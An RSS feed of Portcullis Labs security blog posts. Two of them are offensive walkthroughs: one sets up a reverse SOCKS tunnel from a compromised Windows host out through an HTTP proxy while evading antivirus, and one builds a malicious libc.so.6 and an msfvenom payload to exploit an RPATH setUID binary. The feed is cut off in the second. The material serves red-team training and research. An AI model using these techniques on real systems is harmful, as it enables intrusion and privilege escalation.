@@ -1,0 +1,1578 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; Blog</title>
+	<atom:link href="https://labs.portcullis.co.uk/category/blog/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/#comments</comments>
+		<pubDate>Sat, 26 Jan 2019 22:06:06 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[devops]]></category>
+		<category><![CDATA[devsecops]]></category>
+		<category><![CDATA[infradev]]></category>
+		<category><![CDATA[orchestration]]></category>
+		<category><![CDATA[seceng]]></category>
+		<category><![CDATA[secops]]></category>
+		<category><![CDATA[sre]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6839</guid>
+		<description><![CDATA[<p>Whilst there are some great examples of how to assess infrastructure as code dynamically with things like the Center for Internet Security&#8216;s Docker benchmark and CoreOS&#8216;s Clair, these kinda run a little too late in the pipeline for my liking. If we want to treat infrastructure as code then surely we ought to be performing [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/">Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Whilst there are some great examples of how to assess infrastructure as code dynamically with things like the <a title="Center for Internet Security" href="https://www.cisecurity.org/">Center for Internet Security</a>&#8216;s <a title="Docker benchmark" href="https://www.cisecurity.org/benchmark/docker/">Docker benchmark</a> and <a title="CoreOS" href="https://github.com/coreos/">CoreOS</a>&#8216;s <a title="Clair" href="https://github.com/coreos/clair">Clair</a>, these kinda run a little too late in the pipeline for my liking. If we want to treat infrastructure as code then surely we ought to be performing code reviews and if we&#8217;re performing code reviews then perhaps we can perform a subset of these checks automatically pre-commit?<span id="more-6839"></span></p>
+<p>Many of the current generation of infrastructure orchestration tools utilise Domain Specific Languages presented through the medium of YAML, JSON etc which allow the infradev team to specify programmatically, the architecture and nature of the infrastructure they manage. Just how secure are these language and where might we find gaps that an offensive party might seek to exploit? In practice, what I was really thinking was, if I want to review commits (automatically), then what exactly do I want my tools to look for and why? This seems like an obvious question but at that point, I hadn&#8217;t seen a huge amount of talk (or more importantly, based on the work I do, evidence) on how others were doing this to review their templates before they&#8217;d been built and deployed&#8230;.</p>
+<p>The good news is that somewhere along the way, whilst I was still asking around and before I started to work on this series of posts, I discovered <a title="cfn_nag" href="https://github.com/stelligent/cfn_nag">cfn_nag</a> which looked like a great start, albeit only if you&#8217;re working on <a title="AWS" href="https://aws.amazon.com/">AWS</a>&#8216;s <a title="CloudFormation" href="https://aws.amazon.com/cloudformation/">CloudFormation</a> platform. Taking inspiration from this discovery, my next search was for a linting tool for Ansible (my preferred choice for infrastructure orchestration) and this too yielded results, namely <a title="ansible-lint" href="https://github.com/ansible/ansible-lint">ansible-lint</a>. It turns out that there is more going on than I&#8217;d originally feared but that if you want to do this kind of thing (and you should), you really want to be looking for linting tools for your preferred templating language. One observation I&#8217;ll make however is that many of these linters don&#8217;t appear to have a regular stream of updates and that they may only support a limited set of checks.</p>
+<p>In the next part of my thought experiment, we’ll take a deeper dive and I&#8217;ll start to consider just how effective these linters are, looking at both the theory of static analysis and code review as it applies to secure development more generally and just as importantly, looking at the assurance these tools can give you.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/">Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/#comments</comments>
+		<pubDate>Fri, 25 Jan 2019 11:36:11 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6813</guid>
+		<description><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2). [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In the context of a Red Team assessment, in this post I&#8217;ll look at some options for using SOCKS to gain external access to an internal network. I&#8217;ll cover the obvious methods and why I&#8217;m overlooking them, a crude method using standard tools (this post) and a more refined approach using modified tools (in part 2).<span id="more-6813"></span></p>
+<p>I recently spent quite a long time preparing for the <a title="CREST Certified Simulated Attack Specialist" href="https://www.crest-approved.org/examination/certified-simulated-attack-specialist/index.html">CREST Certified Simulated Attack Specialist</a> exam. While I won&#8217;t be discussing exam content (which I&#8217;m under NDA for), I thought it could be beneficial to write up at least some of the interesting stuff that I prepared prior to sitting the exam.</p>
+<p>I spent a lot of time testing my tools and techniques against 5 different Anti-Virus (AV) products. I wanted to be sure that I had enough options available to me during the exam to operate efficiently, even if AV was present.  One scenario that I wanted to be prepared for was:</p>
+<ul>
+<li>Having a foothold (command execution) on a <em>Windows </em>system in an internal network; but</li>
+<li>being unable to deploy my normal C2 software (<a title="Cobalt Strike" href="https://www.cobaltstrike.com/">Cobalt Strike</a> / <a title="Meterpreter" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a>) due to Anti-Virus / Endpoint Protection.</li>
+</ul>
+<p>My practice had shown that I was able to deploy my C2 software of choice onto only 4 out 5 test systems. So this seemed like something I needed to prepare for. Just in case.</p>
+<p>In parallel with this, I&#8217;d found that performance of SOCKS over a reverse HTTPS connection was barely adequate for tunneling an RDP connection. So I was interested in finding a solution that was:</p>
+<ul>
+<li>Faster</li>
+<li>Worked through a proxy; and</li>
+<li>Worked in the presence of my nemesis AV product</li>
+</ul>
+<p>My instinct was to try to SSH out of the network and use the SOCKS proxy built into SSH.  There were a few problems with this approach:</p>
+<ol>
+<li>I needed an SSH client &#8211; which I could solve by using <a title="Putty" href="https://www.putty.org/">Putty</a> (read on for the reason I didn&#8217;t use plink)</li>
+<li>I needed to get an SSH connection out of the network &#8211; which could probably do via the proxy using <a title="HTTP CONNECT" href="https://en.wikipedia.org/wiki/HTTP_tunnel">HTTP CONNECT</a> in the same way used for legitimate TLS connections</li>
+<li>SSH allows SSH clients to send traffic through a SOCKS proxy running on the SSH server. This was the opposite to what I needed. I needed the SSH server (on the &#8220;internet&#8221;) to be able to access a SOCKS Proxy running on the SSH Client. Which is a Windows box in this scenario. If the compromised host had been a *NIX host, I could potentially have SSH&#8217;d to localhost with the -D option to get the SOCKS server running, then made a second connection to the Internet to port-forward access to the SOCKS service</li>
+</ol>
+<div id="attachment_6823" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6814"><div class="lb-album"><a href="#image-6814"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow-300x191.png" alt="Communication Flow between Devices" class="size-medium wp-image-6823"><span></span></a></div>              
+<a href="#imageclose-6814" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6814">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/protocol-flow.png" alt="image-6814">
+                   </div></a><p class="wp-caption-text">Communication flow between devices</p></div>
+<h2>Solving (3): SOCKS server</h2>
+<p>To solve (3) I looked for a small command line SOCKS proxy that ran on Windows. I did find some, but they all felt a bit dodgy and some said on their website that they definitely weren&#8217;t malware, despite what AV products said. Which is probably true, but it made them a poor option if I wanted to operate in the presence of AV.</p>
+<p>Eventually I stumbled on a <a title="SOCKS5 implementation written in golang" href="https://github.com/armon/go-socks5">SOCKS5 implementation written in golang</a> written by <a title="Armon Dagar" href="https://github.com/armon">Armon Dagar</a>. I&#8217;d heard that golang malware would be on the rise in 2019, so this was a good opportunity for me to waste valuable revision time on a side-interest. I&#8217;d never even compiled a golan program before. If this wasn&#8217;t too hard, it would be a nice cross-platform solution for my needs.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ mkdir -p ~/go/src
+$ cd !$
+$ git clone https://github.com/armon/go-socks5
+$ mv go-socks5 socks5
+$ cd socks5
+$ go build
+</pre>
+<p>No errors <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>But no server either. This is just a library! You need to write some code to use it. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_sad.gif" alt=":-(" class="wp-smiley" /> </p>
+<p>Fortunately, the author provides an example that&#8217;s easily adapted:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+mkdir -p ~/go/src/mysocks5
+cd !$
+$ cat &lt;&lt; EOF &gt; mysocks.go
+// Create a SOCKS5 server
+package main
+import &quot;socks5&quot;
+
+func main() {
+  conf := &amp;socks5.Config{}
+  server, err := socks5.New(conf)
+  if err != nil {
+    panic(err)
+  }
+
+  // Create SOCKS5 proxy on localhost port 1080
+  if err := server.ListenAndServe(&quot;tcp&quot;, &quot;127.0.0.1:1080&quot;); err != nil {
+    panic(err)
+  }
+}
+EOF
+go build
+</pre>
+<p>Done! I now had a &#8220;mysocks5&#8243; executable. And it worked. Repeating similar steps on Windows gave me a working mysocks5.exe. I was starting to like golang at this point.</p>
+<h2>Solving (1): Putty configuration</h2>
+<p>After getting almost to the finish line with the following plink command, I couldn&#8217;t specify an HTTP proxy from the command line:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+plink -N -P 443 -i puttykey.priv.ppk -R 2080:127.0.0.1:1080 -hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a tunnnel@192.168.0.1
+</pre>
+<p>A quick overview of options here:</p>
+<ul>
+<li>-N: &#8211; I don&#8217;t need a shell, just an SSH connection for port forwarding</li>
+<li>-P 443 &#8211; Target port 443, not 22 since the proxy is likely to restrict us in this way</li>
+<li>-i puttykey.priv.ppk &#8211; The private key to access my listening SSH server, I needed logon to be non-interactive, obviously</li>
+<li>-R 2080:127.0.0.1:1080 &#8211; Open a listening port (2080) on the SSH server and forward connections to that port to 127.0.0.1:1080 on the SSH client</li>
+<li>-hostkey db:b0:69:08:20:b1:61:2d:da:f4:e2:d8:0f:b8:71:9a &#8211; We don&#8217;t want any warnings or questions about unverified host keys</li>
+<li>tunnnel@192.168.0.1 &#8211; Log into 192.168.0.1 as user tunnel</li>
+</ul>
+<p>Using the normal putty.exe GUI, I saved a session that specified all of the above detail, plus the required proxy settings (unauthenticated in the case of my lab):</p>
+<div id="attachment_6822" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6815"><div class="lb-album"><a href="#image-6815"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy-300x282.png" alt="Proxy Settings for SSH Connection in Putty" class="size-medium wp-image-6822"><span></span></a></div>              
+<a href="#imageclose-6815" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6815">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/putty-proxy.png" alt="image-6815">
+                   </div></a><p class="wp-caption-text">Proxy settings for SSH connection in Putty</p></div>
+<p>I saved a putty session called myproxy, then retried plink:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+plink -load myproxy
+</pre>
+<p>It crashed. Hence, why I&#8217;m not using plink.  Putty works fine, though:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+putty -load myproxy
+</pre>
+<p>Well, sort of fine. The victim user would have a suspicious-looking putty window pop up alongside the mysocks console window. But this is just a PoC. Let&#8217;s ignore these missing optimisations!</p>
+<div id="attachment_6830" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6816"><div class="lb-album"><a href="#image-6816"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective-300x110.png" alt="How the attack looks from user' class="size-medium wp-image-6830"><span></span></a></div>              
+<a href="#imageclose-6816" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6816">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2019/01/user-prespective.png" alt="image-6816">
+                   </div></a><p class="wp-caption-text">How the attack looks from user&#8217;s perspective</p></div>
+<p>On the server-side, we see a network listener on port 2080.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+tcp 0 0 0.0.0.0:2080 0.0.0.0:* LISTEN
+</pre>
+<p>I wanted the service bound to 0.0.0.0 for my environment, but consider that anyone with network access could abuse your SOCKS proxy.</p>
+<p>This provides a relatively high-performance SOCKS server &#8211; much better than those laggy SOCKS-over-reverse-HTTPS connections. Implants typically poll periodically over HTTPS, which means that traffic can only be sent when the implant calls home. The above method is more akin to SOCKS-over-reverse-TCP. Data can be sent in either direction immediately without waiting for a check-in. Arguably, the above method will create a more suspicious traffic pattern and some application-layer aware proxies won&#8217;t allow it (though tunneling over SSL could help).</p>
+<h2>Packaging it up</h2>
+<p>To deliver above attack, we need to package up the software and configuration so it can be run from the command line. We&#8217;ll assume that we can upload and unpack zip files for this part (or the post will get too long). I included the following in myproxy.zip:</p>
+<ul>
+<li>putty.exe</li>
+<li>mysocks5.exe</li>
+<li>myproxy.reg &#8211; Created by doing &#8220;reg export HKCU\Software\SimonTatham myproxy.reg&#8221;, then removing unnecessary configuration data in a text editor</li>
+<li>puttykey.priv.ppk &#8211; Created using puttygen, be sure to copy the openssh-format public key into ~tunnel/.ssh/authorized_key on the SSH server too</li>
+<li>mysocks.bat &#8211; See below</li>
+</ul>
+<p>To deploy, we need to run mysocks.bat, which does the following:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+reg import myproxy.reg
+start mysocks5
+putty -load myproxy
+</pre>
+<p>All finished. We can pivot through our fast SOCKS proxy. For example, to access RDP on the internal network, I&#8217;d do something like:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat /etc/proxychains.conf
+...
+socks5  127.0.0.1 2080
+$ proxychains remmina
+</pre>
+<p>Where <a title="remmina" href="https://remmina.org/">remmina</a> is a pretty awesome RDP client for Linux. You can also use <a title="proxifier" href="https://www.proxifier.com/">proxifier</a> on Windows if you&#8217;d rather use mstsc.exe.</p>
+<h2>Conclusion</h2>
+<p>We showed a PoC to get a reverse SOCKS connection out of a network using tools that won&#8217;t trigger AV. They don&#8217;t require privileges run, so would work against an unprivileged windows user. The connection is faster than if we&#8217;d used the SOCKS features of C2 solutions that use polling reverse-HTTPS connections.</p>
+<p>Our attack is untidy because the user can see everything that happens! It&#8217;s also awkward to set up because of the registry export and required packaging.</p>
+<h2>Further Reading</h2>
+<ul>
+<li><a title="Chisel" href="https://github.com/jpillora/chisel">Chisel</a> is a tool that can create a SOCKS-over-SSH-over-CONNECT-HTTP tunnel in the opposite direction the direction I needed</li>
+<li><a title="Crowbar" href="https://github.com/q3k/crowbar">Crowbar</a> is a tool that lets you do port forwarding over HTTP channels (no reliance on the proxy CONNECT method)</li>
+</ul>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>An offensive introduction to Active Directory on UNIX</title>
+		<link>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/</link>
+		<comments>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/#comments</comments>
+		<pubDate>Thu, 06 Dec 2018 09:18:36 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[Black Hat Europe]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6805</guid>
+		<description><![CDATA[<p>By way of an introduction to our talk at Black Hat Europe, Security Advisory EMEAR would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests. Background to Active Directory integration [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>By way of an introduction to <a href="https://www.blackhat.com/eu-18/briefings/schedule/index.html#where-2-worlds-collide-bringing-mimikatz-et-al-to-unix-12962" title="our talk">our talk</a> at Black Hat Europe, <a href="https://www.cisco.com/c/en/us/products/security/advisory-services.html" title="Security Advisory EMEAR">Security Advisory EMEAR</a> would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests.<span id="more-6805"></span></p>
+<h2>Background to Active Directory integration solutions</h2>
+<p>Having seen an uptick in unique UNIX infrastructures that are integrated into customers&#8217; existing Active Directory forests, the question becomes, &#8220;Does this present any concerns that may not be well understood?&#8221; This quickly became &#8220;What if an adversary could get into a UNIX box and then breach your domain?&#8221;<br />
+Within a typical Active Directory integration solution (in this case <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/5.7_release_notes/sssd" title="SSSD">SSSD</a>), the solution shares a striking similarity to what a user might see on Windows. Notably, you have:</p>
+<ul>
+<li>DNS &#8211; Used for name resolution</li>
+<li>LDAP &#8211; Used for &#8220;one-time identification&#8221; and assertion of identity</li>
+<li>Kerberos &#8211; Used for ongoing authentication</li>
+<li>SSSD &#8211; Like LSASS</li>
+<li>PAM &#8211; Like msgina.dll or the more modern credential providers</li>
+</ul>
+<p>You can see a breakdown of this process <a title="here" href="https://rhelblog.redhat.com/2015/02/04/overview-of-direct-integration-options/">here</a>. Unlike Windows, there is no Group Policy for the most part (with some exceptions), so policies for sudo et al. are typically pushed as flat files to hosts.</p>
+<h2>Our research</h2>
+<p>Realistically, the threat models associated with each part of the implementation should be quite familiar to anyone securing a heterogeneous Windows network. Having worked with a variety of customers, it becomes apparent that the typical UNIX administrator who does not have a strong background in Windows and Active Directory will be ill-equipped to handle this threat. While we&#8217;ve been talking about successful attacks against components such as LSASS and Kerberos for quite some time, Mimikatz dates back to at least April 2014, and dumping hashes has been around even longer. Pwdump, which dumped local Windows hashes, was published by Jeremy Allison in 1997). However, no one has really taken a concerted look at whether these attacks are possible on UNIX infrastructure, nor how a blue team might spot an adversary performing them.</p>
+<p>As a result of this research, we were able to develop tactics, tools, and procedures that might further assist an attacker in breaching an enterprise, and we began documenting and developing appropriate strategies to allow blue teams to appropriately detect and respond to such incursions. The Black Hat EU slides can be found <a title="here" href="/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">here</a> and whilst the tools we developed can be found on <a href="https://github.com/portcullislabs/linikatz" title="our GitHub repo">our GitHub repo</a>.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>SetUID program exploitation: Crafting shared object files without a compiler</title>
+		<link>https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/</link>
+		<comments>https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/#comments</comments>
+		<pubDate>Wed, 31 Oct 2018 12:18:59 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6581</guid>
+		<description><![CDATA[<p>In this post we look at an alternative to compiling shared object files when exploiting vulnerable setUID programs on Linux. At a high level we&#8217;re just going to copy the binary and insert some shellcode. First we take a look the circumstances that might lead you to use this option. Also check out this previous post [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/">SetUID program exploitation: Crafting shared object files without a compiler</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In this post we look at an alternative to compiling shared object files when exploiting vulnerable setUID programs on Linux. At a high level we&#8217;re just going to copy the binary and insert some shellcode. First we take a look the circumstances that might lead you to use this option. Also check out this <a title="previous post on setUID exploitation" href="/blog/exploiting-inherited-file-handles-in-setuid-programs">previous post on setUID exploitation</a>.<span id="more-6581"></span></p>
+<h2>A hacker challenge gone wrong</h2>
+<p>A long time ago, I set my team challenge of identifying an <a title="Breaking the Links: Exploiting the Linker" href="/presentations/breaking-the-links-exploiting-the-linker/">RPATH vulnerability</a> and (if possible) exploiting the vulnerability to run some code of their choosing with higher privileges. I named my program arp-ath &#8211; lest people wasted too much time looking for other attack vectors:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat arp-ath.c
+#include &lt;stdio.h&gt;
+int main(void) {
+ printf(&quot;Hello world\n&quot;);
+}
+$ gcc -Wl,-rpath,. -o arp-ath arp-ath.c
+# chmod 4755 arp-ath
+</pre>
+<p>The program behaves as you&#8217;d expect and is linked to libc.so.6 as you&#8217;d expect:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./arp-ath
+Hello world
+$ ldd arp-ath
+ linux-vdso.so.1 =&gt; (0x00007fff0a3fd000)
+ libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb6dc0d6000)
+ /lib64/ld-linux-x86-64.so.2 (0x00007fb6dc489000)
+</pre>
+<p>The vulnerability lies in the fact the program seaches the current directory for its libraries:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ readelf -a arp-ath | grep -i path
+0x000000000000000f (RPATH) Library rpath: [.]
+</pre>
+<p>(You&#8217;ll sometimes see RUNPATH instead of RPATH, but both work). Check it&#8217;s vulnerable like this:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ touch libc.so.6
+$ ./arp-ath
+./arp-ath: error while loading shared libraries: ./libc.so.6: file too short
+</pre>
+<p>This challenge is very similar to Level 15 of the <a title="Nebula Challenge" href="https://exploit-exercises.com/nebula/">Nebula challenge</a> if you want to play along using that &#8211; though it&#8217;s 32-bit.</p>
+<p>The team found the &#8220;arp-ath&#8221; vulnerability pretty quickly and replied to let me know. Which you&#8217;d expect as it is their job to find such vulnerabilities on client systems during Build Reviews.</p>
+<p>What I hadn&#8217;t personally anticipated is what a pain it is to create a malicious modified version of libc.so.6 on 64-bit Linux. So rather than face the embarrassment of having posted a challenge that I didn&#8217;t actually have a full solution for, I cobbled together the shellcode-based solution outlined above. First let&#8217;s have a look at the difficulties I had in creating my own libc.so.6.</p>
+<h2>Problems compiling a replacement libc.so.6 on 64-bit Linux</h2>
+<p>I lost my original notes of what I&#8217;d tried, but I&#8217;m pretty sure that I and my colleagues followed a similar path to this <a title="Nebula Level 15 Solution" href="http://www.pwntester.com/blog/2013/11/26/nebula-level15-write-up/">solution to the Nebula level 15 challenge</a> - which has a really nice writeup of how to debug shared libraries that don&#8217;t want to work.</p>
+<p>Here&#8217;s an initial attempt, which should cause a shell to spawn when the library is loaded (note I could also have replaced the &#8220;puts&#8221; function).</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat exploit1.c
+#include &lt;stdlib.h&gt;
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
+ system(&quot;/bin/sh&quot;);
+}
+$ gcc -fPIC -shared -o libc.so.6 exploit1.c
+$ ldd ./arp-ath
+./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
+./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
+linux-vdso.so.1 (0x00007ffeea77d000)
+libc.so.6 =&gt; ./libc.so.6 (0x00007f50430f9000)
+$ ./arp-ath
+./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
+./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
+./arp-ath: relocation error: ./libc.so.6: symbol __cxa_finalize, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
+</pre>
+<p>So, let&#8217;s address those errors about lack of version numbers and failure to export __cxa_finalize (after much googling)&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat version
+GLIBC_2.2.5{};
+$ cat exploit2.c
+#include &lt;stdlib.h&gt;
+
+void __cxa_finalize (void *d) {
+ return;
+}
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
+ system(&quot;/bin/sh&quot;);
+}
+$ gcc -fPIC -shared -Wl,--version-script=version -o libc.so.6 exploit2.c
+$ ./arp-ath
+./arp-ath: relocation error: ./libc.so.6: symbol system, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
+</pre>
+<p>Hmm. More errors.</p>
+<p>Cutting short a very long sequence of trial and error, when we eventually try to replicate the solution to the Nubula level 15 challenge on 64-bit, we find that it only seems to work for 32-bit:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 exploit2.c
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(system.o): relocation R_X86_64_32 against `.bss' can not be used when making a shared object; recompile with -fPIC
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sysdep.o): relocation R_X86_64_TPOFF32 against symbol `errno' can not be used when making a shared object; recompile with -fPIC
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sigaction.o): relocation R_X86_64_32S against `.text' can not be used when making a shared object; recompile with -fPIC
+/usr/bin/ld: final link failed: Nonrepresentable section on output
+collect2: error: ld returned 1 exit status
+</pre>
+<p>If I understood my googling correctly, I need a version of libc that&#8217;s been compiled with -fPIC, but that&#8217;s not possible for some reason I didn&#8217;t understand.</p>
+<p>I did consider grabbing the source for libc and recompiling it after a modification, but decided life was too short. I had a better (or at least quicker) idea&#8230;</p>
+<h2>So just use metasploit, then?</h2>
+<p>I had a quick go at generating a shared object file with msfvenom:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+msfvenom -a x64 -f elf-so -p linux/x64/exec CMD=/bin/sh AppendExit=true &gt; libc.so.6
+$ ./arp-ath
+./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
+./arp-ath: symbol lookup error: ./arp-ath: undefined symbol: __libc_start_main, version GLIBC_2.2.5
+</pre>
+<p>This was awfully familiar. I didn&#8217;t grapple much more with msfvenom after this.</p>
+<h2>Patching shellcode into a copy of libc.so.6</h2>
